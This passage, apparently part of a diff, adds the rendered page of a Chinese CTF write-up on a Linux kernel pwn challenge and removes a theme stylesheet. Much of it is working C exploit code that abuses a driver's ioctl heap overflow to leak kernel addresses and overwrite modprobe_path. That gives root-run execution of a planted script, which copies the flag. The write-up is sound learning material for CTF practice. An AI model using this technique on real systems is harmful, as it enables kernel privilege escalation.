class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">5</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">6</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">6</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x8</span>;</span><br><span class="line">    arg.offset = <span class="number">-0x8</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    mode_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line">    pool_addr = mode_addr + <span class="number">0x2400</span>;</span><br><span class="line"></span><br><span class="line">    arg.idx = <span class="number">5</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = pool_addr + <span class="number">0x90</span>;</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr = mod_tree_addr + <span class="number">0x2e960</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">7</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = modprobe_path_addr;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf + <span class="number">1</span>) = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strncpy</span>(buf, <span class="string">&quot;/home/pwn/copy.sh\x00&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    arg.idx = <span class="number">9</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x18</span>;</span><br><span class="line">    arg.offset = <span class="number">0</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220810155109129.png"
+                      alt="image-20220810155109129"
+                ></p>
+<p>当然其实在劫持到pool这一步也是可以直接使用 <a href="https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/">WCTF 2018 klist</a> 这道题的利用方式，利用堆溢出泄漏出cred然后修改cred结构体即可，因为这道题目的漏洞相对来说比较严重，所以ptmx劫持栈什么的都是可以的。这篇文章主要是记录没有遇到过的利用方法。</p>
+<hr>
+<p>参考链接：<a class="link"   target="_blank" rel="noopener" href="http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87" >http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">modify_ldt利用</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/07/WCTF-2018-klist/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">WCTF 2018 klist</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+        
+    
+</div>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
-
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+            </div>
+        
+    </div>
+</div>
 
 
                 
